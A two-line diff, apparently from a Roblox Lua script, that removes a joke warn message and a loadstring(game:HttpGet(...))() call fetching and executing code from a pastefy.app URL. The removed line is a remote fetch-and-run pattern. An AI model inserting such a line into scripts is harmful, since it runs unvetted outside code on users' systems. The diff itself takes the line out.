@@ -1,2 +1,0 @@
-warn("im a furry")
-loadstring(game:HttpGet("https://pastefy.app/49MJHRVi/raw?part=furry.lua"))()
